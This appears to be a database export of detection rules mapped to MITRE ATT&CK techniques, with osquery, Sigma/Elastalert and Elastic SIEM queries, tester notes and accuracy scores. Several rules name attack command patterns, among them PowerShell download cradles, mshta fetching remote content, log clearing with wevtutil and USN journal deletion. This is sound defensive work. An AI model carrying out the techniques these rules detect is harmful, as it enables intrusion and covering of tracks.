29	yes	OSQuery		#008000	Authentication logs,Process use of network,Process monitoring	"{'accuracy_score': 90}"	T1136.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"other": [], "sigma": [{"rule": "lnx_auditd_create_account.yml", "elastalert": {"name": "creation_of_an_user_account_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(agent.type:filebeat AND message:(*useradd* OR *adduser*))"}}], "realert": {"minutes": 0}, "priority": 3, "description": "Detects the creation of a new user account. According to MITRE ATT&CK, \\"such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system\\""}}], "osquery": [], "elasticsiem": []}, "windows": {"other": [], "sigma": [], "osquery": ["select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%net.exe%';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
4	no	other	Unable to verify since it required Azure and AWS authentication.	#FFFFFF	AWS CloudTrail logs,Stackdriver logs,Azure activity logs,GCP audit logs	"{'accuracy_score': 0}"	T1098.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"1. Azure Account Manipulation Detection :\\nhttps://docs.microsoft.com/en-us/azure/azure-resource-manager/management/view-activity-logs\\n2. AWS Account Manipulation Detection :\\nhttps://aws.amazon.com/premiumsupport/knowledge-center/potential-account-compromise/\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
16	no	other	MacOS Dependency.	#FFFFFF	API monitoring,Windows event logs,Process commandline parameters,Process monitoring,File monitoring,Windows Registry	"{'accuracy_score': 0}"	T1543.004	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"Monitor for launch daemon creation or modification through plist files and utilities such as Objective-See's KnockKnock application.\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
25	no	OSQuery	T1484.001 - \n1. Detect GPO modifications by monitoring directory service changes using Windows event logs. \n2. GPO abuse will often be accompanied by some other behavior such as Scheduled Task/Job, which will have events associated with it to detect.\n\nComment: No output for windows event id query.\nT1484.002 - \n1. Need to edit group policy abjects in AD to perform attack.	#FFFFFF	Windows event logs	"{'accuracy_score': 0}"	T1484	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select * from windows_events where eid in (5136,5137,5138,5139,5141);", "select * from windows_events where eid in (4672,5704);", "select * from powershell_events;"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
467	no	\N		#FFFFFF	\N	{"accuracy_score": 0}	T1548	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": [{"zeek": [], "other": [], "sigma": [{"key": "", "value": ""}], "osquery": ["select * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and filename like '%wevtutil.exe%';"], "elasticsiem": []}, {"zeek": [], "other": [], "sigma": [], "osquery": ["select * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and filename like '%wevtutil.exe%';", "select * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and filename like '%wevtutil.exe%';", "select * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and filename like '%wevtutil.exe%';"], "elasticsiem": []}]}}}}	2021-07-09 10:20:49.976666+00
112	no	yaml	"Partial detection and attack technique as the yaml file availableprovides incomplete information\n\nFalse positives not handled"	#FFFFFF		"{'accuracy_score': 0}"	T1136	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "\\"Filebeat\\nmessage : type=SYSCALL and *exec= /useradd\\nElastalert\\nmatch_body.message : type=SYSCALL and *comm= useradd\\"", "elastalert": ""}], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
147	no	OSQuery		#FFFFFF	Process monitoring,Process use of network	"{'accuracy_score': 0}"	T1020	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select p.name, p.path, lp.port, lp.address, lp.protocol  from listening_ports lp LEFT JOIN processes p ON lp.pid = p.pid WHERE lp.port != 0 AND p.name != '';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
128	no	other		#FFFFFF	Office  audit logs	"{'accuracy_score': 0}"	T1098.003	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"Collect usage logs from cloud administrator accounts to identify unusual activity in the assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins.\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
196	yes	other,yaml,OSQuery	["Will need to write sigma rules to detect logon attempts from network outside business hours.", "https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/basic-audit-logon-events"]	#800080	Authentication logs,Browser extensions	"{'accuracy_score': 70}"	T1133	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"other": [], "sigma": [{"rule": "lnx_susp_failed_logons_single_source.yml", "elastalert": ""}], "osquery": [], "elasticsiem": []}, "windows": {"other": ["[\\"1. Collect authentication logs for unsusal access patterns, windows of activity and access outside of business hours.\\"]"], "sigma": [{"rule": "win_susp_failed_logon_source.yml", "elastalert": ""}], "osquery": ["select u.username, ce.name,ce.identifier,ce.version,ce.description,ce.locale,ce.update_url,ce.author,ce.persistent,ce.path from chrome_extensions ce LEFT JOIN users u ON ce.uid = u.uid;"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
76	yes	OSQuery,other	Not tried how firewalls, proxies or NIDS could block parameters in URL or do MITM inspection.	#FFA500	Process use of network,Packet capture,Network device logs,Process use of network,Web proxy,Network intrusion detection system,SSLTLS inspection	"{'accuracy_score': 20}"	T1189	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["https://raw.githubusercontent.com/CptOfEvilMinions/BlogProjects/master/osquery-url-monitor/conf/osquery/osquery.conf", "1. Firewalls and proxies can block potentially known-bad domains or parameters in URLs.\\", \\"2. NIDS with SSL/TLS MITM inspection can be used to look for known malicious scripts. \\", \\"3. Detect unusual behavior of browser processes, Process injection for attempts to hide execution, or other unusual network traffic."], "sigma": [], "osquery": ["select DISTINCT p.name, p.path, pos.remote_address, pos.remote_port from process_open_sockets pos LEFT JOIN processes p ON pos.pid = p.pid WHERE pos.remote_port != 0 AND p.name != '';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
51	yes	OSQuery		#008000	Browser extensions,Windows Registry	"{'accuracy_score': 90}"	T1176	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"osquery": ["SELECT u.username, ce.* FROM users u CROSS JOIN chrome_extensions ce USING (uid);", "SELECT u.username, ce.* FROM users u CROSS JOIN firefox_addons ce USING (uid);", "SELECT u.username, ce.* FROM users u CROSS JOIN opera_extensions ce USING (uid);"]}, "windows": {"other": [], "sigma": [], "osquery": ["SELECT u.username, ce.* FROM users u CROSS JOIN chrome_extensions ce USING (uid);", "SELECT u.username, ce.* FROM users u CROSS JOIN firefox_addons ce USING (uid);", "SELECT u.username, ce.* FROM users u CROSS JOIN opera_extensions ce USING (uid);", "select * from ie_extensions;", "select u.username, ce.name,ce.identifier,ce.version,ce.description,ce.locale,ce.update_url,ce.author,ce.persistent,ce.path from chrome_extensions ce LEFT JOIN users u ON ce.uid = u.uid;"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
452	yes	OSQuery,yaml	T1076 Steps Followed from: https://www.ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement Actual : event_id: 4624 and logon_type:5 and user_logon_id: 999 Expected: event_id:4624 and src_ip_address: 127.0.0.1 and logon_type: 10	#FFA500	Authentication logs	{"accuracy_score": 20}	T1021.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "sigma_win_rdp_localhost_login", "elastalert": {"name": "51e33403-2a37-4d66-a574-1fda1782cc31_0 RDP Login from Localhost", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "event_id:\\"4624\\" AND logon_type:\\"10\\" AND src_ip_addr:(\\"::1\\" OR \\"127.0.0.1\\")"}}], "realert": {"minutes": 0}, "priority": 2, "description": "RDP login with localhost source address may be a tunnelled login", "timestamp_field": "etl_processed_time"}}, {"rule": "sigma_win_rdp_reverse_tunnel.yml", "elastalert": {"name": "5bed80b6-b3e8-428e-a3ae-d3c757589e41_0 RDP over Reverse SSH Tunnel WFP", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query": {"query_string": {"query": "(event_id:\\"5156\\" AND ((src_port:\\"3389\\" AND dst_ip_addr:127.0.0.1) OR (dst_port:\\"3389\\" AND src_ip_addr:127.0.0.1)))"}}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects svchost hosting RDP termsvcs communicating with the loopback address", "timestamp_field": "etl_processed_time"}}], "osquery": ["select * from users;", "select datetime(time,'unixepoch','UTC') as time_utc,host,user,tty,pid,type from logged_in_users;"], "elasticsiem": []}}}}}	2021-07-19 12:39:56.025894+00
138	yes	OSQuery,yaml		#008000	Authentication logs,Process monitoring,Windows event logs	"{'accuracy_score': 90}"	T1136.002	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"osquery": ["select datetime(time,'unixepoch','UTC') as time_utc,host,user,tty,pid,type from logged_in_users;", "select datetime(time,'unixepoch','UTC') as time_utc,host,username,tty,pid,type from last;"]}, "windows": {"other": [], "sigma": [{"rule": ["win_new_or_renamed_user_account_with_dollar_sign.yml"], "elastalert": ""}, {"rule": ["win_net_user_add.yml"], "elastalert": ""}], "osquery": ["select * from users;", "select datetime(time,'unixepoch','UTC') as time_utc,host,user,tty,pid,type from logged_in_users;"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
460	no		\N	#FFFFFF	Process monitoring,System calls	"{'accuracy_score': 0}"	T1055.014	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"other": [], "sigma": [], "osquery": ["select usr.username, sht.command, sht.history_file from shell_history sht JOIN users usr ON sht.uid = usr.uid WHERE sht.uid IN (SELECT uid from users);"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
462	yes		\N	#FFA500	Process monitoring	"{'accuracy_score': 20}"	T1087.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and filename like '%net.exe%';", "select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.cmdline != '';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
7	yes			#FFA500	File monitoring,Data loss prevention	"{'accuracy_score': 30}"	T1025	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"linux": ["SELECT device, device_alias, flags, path,type from mounts;"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
74	yes	OSQuery,yaml	Windows eventlog(audit) might provide info on API usage by processes. Need to verify this technique. Elastalert verification is done for lazarus sigma rule.\nwindows event logs.\nTurn on powershell script block logging.	#008000	API monitoring,Process monitoring,Process commandline parameters,Process monitoring,PowerShell logs	{"accuracy_score": 90}	T1070.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "win_wevtutil_clear_export_logs.yml", "elastalert": {"name": "clearing/exporting_windows_security_event_logs_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "((process.command_line:(\\"*epl Security*\\" OR \\"*export-log Security*\\" OR \\"*cl Security*\\" OR \\"*clear-log Security*\\") AND process.executable:*wevtutil.exe) AND (NOT (process.parent.executable:*MsSense.exe)))"}}], "realert": {"minutes": 0}, "priority": 3, "description": "Detects the use of wevtutil to clear or export Windows Security logs"}}, {"rule": "win_susp_fsutil_usage.yml", "elastalert": {"name": "fsutil_suspicious_invocation_0", "type": "any", "alert": ["debug"], "index": "winlogbeat-*", "filter": [{"query_string": {"query": "((process.executable:*\\\\fsutil.exe OR OriginalFileName:\\"fsutil.exe\\") AND process.command_line:(*deletejournal* OR *createjournal*))"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects suspicious parameters of fsutil (deleting USN journal, configuring it with small size, etc). Might be used by ransomwares during the attack (seen by NotPetya and others)."}}], "osquery": ["select * from windows_events where eventid=1102;", "select * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and filename like '%wevtutil.exe%';", "select * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and filename like '%fsutil.exe%';"], "elasticsiem": [{"name": "Windows Event Logs Cleared", "query": "event.action:(\\"audit-log-cleared\\" or \\"Log clear\\")"}, {"name": "Windows Event Logs Cleared using wevtutil", "query": "process where process.name: \\"wevtutil.exe\\" and process.args in (\\"cl\\", \\"clear-log\\")"}]}}}}}	2021-07-20 08:26:13.798546+00
456	no	yaml	\N	#FFFFFF	Process use of network	"{'accuracy_score': 0}"	T1104	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "win_susp_ps_downloadfile.yml", "elastalert": {"name": "powershell_downloadfile_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(agent.type:winlogbeat AND process.command_line:(*powershell.exe* AND *Net.WebClient* AND *DownloadString*))"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects the execution of powershell, a WebClient object creation and the invocation of DownloadFile in a single command line"}}], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
457	no	yaml	\N	#FFFFFF	Process commandline parameters,Process monitoring	"{'accuracy_score': 0}"	T1218.010	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "win_html_help_spawn.yml", "elastalert": {"name": "html_help_shell_spawn_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.executable:(*cmd.exe OR *powershell.exe OR *wscript.exe OR *cscript.exe OR *regsvr32.exe OR *wmic.exe OR *rundll32.exe) AND process.parent.executable:\\"C\\\\:\\\\Windows\\\\hh.exe\\")"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects a suspicious child process of a Microsoft HTML Help system when executing compiled HTML files (.chm)"}}], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
177	yes	OSQuery,other	["Need Office to tryout use of yara rules. References:", "1. https://blog.nviso.eu/2017/10/11/detecting-dde-in-ms-office-documents/", "2. https://blog.nviso.eu/2017/02/14/hunting-with-yara-rules-and-clamav/"]	#FFA500	Process monitoring,File monitoring,Process monitoring	"{'accuracy_score': 20}"	T1559.002	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"OLE and Office Open XML files can be scanned for DDEAUTO', DDE, and other strings indicative of DDE execution.\\"]"], "sigma": [], "osquery": ["SELECT name as bad_parent_child_name, pid bad_parent_child_pid FROM processes WHERE pid=(SELECT parent FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='cmd.exe') OR pid=(SELECT pid FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='cmd.exe');"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
187	yes	other	["Systemd timer unit files may be detected by auditing file creation and modification events within the /etc/systemd/system, /usr/lib/systemd/system/, and ~/.config/systemd/user/", "Couldn't try to create timer service on Linux machine using systemd. Need to create timer first to detect it."]	#FFA500	File monitoring	"{'accuracy_score': 5}"	T1053.006	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select * from file_events;", "select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.cmdline like '%systemd%';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
461	yes		\N	#FFA500		"{'accuracy_score': 20}"	T1003.008	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"osquery": ["select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.cmdline != '';", "select usr.username, sht.command, sht.history_file from shell_history sht JOIN users usr ON sht.uid = usr.uid WHERE sht.uid IN (SELECT uid from users);"]}, "windows": {"other": [], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
41	yes	OSQuery,yaml		#800080	Process monitoring,Process commandline parameters,Process commandline parameters,Process monitoring	"{'accuracy_score': 70}"	T1059.003	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "win_apt_babyshark.yml", "elastalert": {"name": "baby_shark_activity_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.command_line:(\\"reg query \\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Terminal\\\\ Server\\\\Client\\\\Default\\"\\" OR powershell.exe mshta.exe http* OR \\"cmd.exe /c taskkill /im cmd.exe\\"))"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects activity that could be related to Baby Shark malware"}}, {"rule": "win_html_help_spawn.yml", "elastalert": {"name": "html_help_shell_spawn_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.executable:(*cmd.exe OR *powershell.exe OR *wscript.exe OR *cscript.exe OR *regsvr32.exe OR *wmic.exe OR *rundll32.exe) AND process.parent.executable:\\"C\\\\:\\\\Windows\\\\hh.exe\\")"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects a suspicious child process of a Microsoft HTML Help system when executing compiled HTML files (.chm)"}}, {"rule": "win_redmimicry_winnti_proc.yml", "elastalert": {"name": "redmimicry_winnti_playbook_execute_0", "type": "any", "alert": ["debug"], "index": "winlogbeat-*", "filter": [{"query_string": {"query": "(process.args:(*gthread-3.6.dll* OR *\\\\Windows\\\\Temp\\\\tmp.bat* OR *sigcmm-2.4.dll*) AND process.executable:(*rundll32.exe* OR *cmd.exe*))"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects actions caused by the RedMimicry Winnti playbook"}}], "osquery": ["select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.cmdline != '';", "SELECT name as bad_parent_child_name, pid bad_parent_child_pid FROM processes WHERE pid=(SELECT parent FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='cmd.exe') OR pid=(SELECT pid FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='cmd.exe');", "SELECT pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.cmdline != '';", "SELECT * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and filename like '%cmd.exe%';", "select * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and filename like '%CMD.exe%';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
54	yes			#008000	Process monitoring,Process commandline parameters,Process monitoring	"{'accuracy_score': 90}"	T1218.005	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "win_susp_mshta_execution.yml", "elastalert": ""}, {"rule": "win_apt_babyshark.yml", "elastalert": {"name": "baby_shark_activity_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.command_line:(\\"reg query \\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Terminal\\\\ Server\\\\Client\\\\Default\\"\\" OR powershell.exe mshta.exe http* OR \\"cmd.exe /c taskkill /im cmd.exe\\"))"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects activity that could be related to Baby Shark malware"}}, {"rule": "win_lethalhta.yml", "elastalert": ""}, {"rule": "win_mshta_javascript.yml", "elastalert": {"name": "mshta_javascript_execution_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.command_line:*javascript* AND process.executable:*mshta.exe)"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Identifies suspicious mshta.exe commands"}}, {"rule": "win_mshta_spawn_shell.yml", "elastalert": ""}, {"rule": "win_possible_applocker_bypass.yml", "elastalert": ""}], "osquery": ["select * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and filename like '%mshta%';", "select * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and filename like '%POWERSHELL.exe%';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
451	yes	other	\N	#0000FF	Process monitoring	{"accuracy_score": 80}	T1564.004	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": [], "elasticsiem": [{"rule": "defense_evasion_unusual_ads_file_creation.toml", "query": "file where event.type in (\\"access\\",\\"creation\\") and\\n  file.path : \\"C:\\\\\\\\*:*\\" and\\n  not file.path : \\"C:\\\\\\\\*:zone.identifier*\\" and\\n  file.extension :\\n    (\\n      \\"pdf\\",\\n      \\"dll\\",\\n      \\"png\\",\\n      \\"exe\\",\\n      \\"dat\\",\\n      \\"com\\",\\n      \\"bat\\",\\n      \\"cmd\\",\\n      \\"sys\\",\\n      \\"vbs\\",\\n      \\"ps1\\",\\n      \\"hta\\",\\n      \\"txt\\",\\n      \\"vbe\\",\\n      \\"js\\",\\n      \\"wsh\\",\\n      \\"docx\\",\\n      \\"doc\\",\\n      \\"xlsx\\",\\n      \\"xls\\",\\n      \\"pptx\\",\\n      \\"ppt\\",\\n      \\"rtf\\",\\n      \\"gif\\",\\n      \\"jpg\\",\\n      \\"png\\",\\n      \\"bmp\\",\\n      \\"img\\",\\n      \\"iso\\"\\n    )"}, {"name": "stream file creation using powershell/cmd_custom.toml", "query": "file where event.type: \\"creation\\" and\\n  file.path: \\"C:\\\\*:*\\" and\\n  not file.path: \\"C:\\\\*:zone.identifier*\\" and\\n  process.name in (\\"cmd.exe\\", \\"powershell.exe\\") and\\n  not file.extension: \\"ini\\""}]}}}}}	2021-07-20 07:34:45.221425+00
11	yes	OSQuery,yaml		#800080	File monitoring,Process monitoring,Process commandline parameters	"{'accuracy_score': 50}"	T1574.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "sysmon_svchost_dll_search_order_hijack.yml", "elastalert": ""}, {"rule": "sysmon_susp_fax_dll.yml", "elastalert": ""}, {"rule": "sysmon_registry_persistence_search_order.yml", "elastalert": ""}], "osquery": ["select * FROM ntfs_journal_events WHERE path like '%AppData%';"], "elasticsiem": ["process where event.code: \\"7\\" and dll.name :\\n  (\\n  \\"wlbsctrl.dll\\",\\n  \\"wbemcomn.dll\\",\\n  \\"WptsExtensions.dll\\",\\n  \\"Tsmsisrv.dll\\",\\n  \\"TSVIPSrv.dll\\",\\n  \\"Msfte.dll\\",\\n  \\"wow64log.dll\\",\\n  \\"WindowsCoreDeviceInfo.dll\\",\\n  \\"Ualapi.dll\\",\\n  \\"wlanhlp.dll\\",\\n  \\"phoneinfo.dll\\",\\n  \\"EdgeGdi.dll\\",\\n  \\"cdpsgshims.dll\\",\\n  \\"windowsperformancerecordercontrol.dll\\",\\n  \\"diagtrack_win.dll\\"\\n  ) and \\nnot (dll.code_signature.subject_name : \\"Microsoft Windows\\" and dll.code_signature.status : \\"trusted\\")"]}}}}}	2021-07-09 10:20:49.976666+00
91	no	other	Not found anything.	#FFFFFF	Process monitoring,File monitoring	"{'accuracy_score': 0}"	T1574.009	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"1. Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \\"findstr,\\" \\"net,\\" and \\"python\\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.\\n2. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
85	yes	yaml	["For Detection Follow below steps:\nConfigured Winlogbeat for codeintegrity events:\n- name: Microsoft-Windows-CodeIntegrity/Operational\n    event_id: 3065,3066,3033,3063\n\nFor Elastaalert:\n1. Convert the win_violated_code_integrity_policy.yml into elastalert query using uncoder.io.\n2. Create and copy the elastaert query in docker's elastalaert rules folder.\n\nSteps to enable audit mode for Lsass.exe:\nRun below command :\n\nreg add ""HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe"" /v AuditLevel /t REG_DWORD /d 00000008 /f\n\nOR\n1. Open the Registry Editor (RegEdit.exe), and navigate to the registry key that is located at: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe.\n2. Set the value of the registry key to AuditLevel=dword:00000008.\n\nRestart the computer.\nAnalyze the results of event 3065 and event 3066."]	#008000	Windows Registry	"{'accuracy_score': 90}"	T1547.002	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "win_violated_code_integrity_policy.yml", "elastalert": ""}], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
172	no	other		#FFFFFF	Process monitoring,File monitoring	"{'accuracy_score': 0}"	T1574.008	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"1. Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \\"findstr,\\" \\"net,\\" and \\"python\\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.\\n2. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
181	no	other	Unable to find anything for detection.	#FFFFFF	API monitoring,Process monitoring,File monitoring	"{'accuracy_score': 0}"	T1547.006	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"1. Loading, unloading, and manipulating modules on Linux systems can be detected by monitoring for the following commands:modprobe, insmod, lsmod, rmmod, or modinfo.  LKMs are typically loaded into /lib/modules and have had the extension .ko (\\"kernel object\\") since version 2.6 of the Linux kernel. \\n2. For macOS, monitor for execution of kextload commands and correlate with other unknown or suspicious activity.\\n3. Adversaries may run commands on the target system before loading a malicious module in order to ensure that it is properly compiled. [3] Adversaries may also execute commands to identify the exact version of the running Linux kernel and/or download multiple versions of the same .ko (kernel object) files to use the one appropriate for the running system.[11] Many LKMs require Linux headers (specific to the target kernel) in order to compile properly. These are typically obtained through the operating systems package manager and installed like a normal package. On Ubuntu and Debian based systems this can be accomplished by running: apt-get install linux-headers-$(uname -r) On RHEL and CentOS based systems this can be accomplished by running: yum install kernel-devel-$(uname -r)\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
129	yes	other	Below are the keys we have to monitor. It will require a version for monitoring. Not able to test these keys since it has dependency on Microsoft word, hence not writing the osquery for these keys. \nHKCU\\Software\\Microsoft\\Office\\vv.0\\Word\\Options\\PROGRAMDIR \n\nHKCU\\software\\microsoft\\office\\vv.v\\word\\options\\GlobalDotName \n\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Word\\Security\n\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Word\\Security\\VBAWarning\n\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Word\\Security\\Trusted Documents\n\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Word\\Security\\Trusted Locations\n\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Word\\Security\\Trusted Locations\\<key_name_of_location>\\\n\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Word\\Security\\Trusted Locations\\<key_name_of_location>\\Path\n\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Word\\Security\\Trusted Locations\\<key_name_of_location>\\AllowSubFolders	#FFA500	Windows Registry	"{'accuracy_score': 30}"	T1137.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["https://www.221bluestreet.com/post/office-templates-and-globaldotname-a-stealthy-office-persistence-technique"], "sigma": [], "osquery": ["select name, type, data from registry where path like 'HKEY_USERS\\\\%\\\\Software\\\\Microsoft\\\\Office\\\\16.0\\\\word\\\\Options\\\\%';", "select name, type, data from registry where path like 'HKEY_USERS\\\\%\\\\Software\\\\Microsoft\\\\Office\\\\16.0\\\\Outlook\\\\%';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
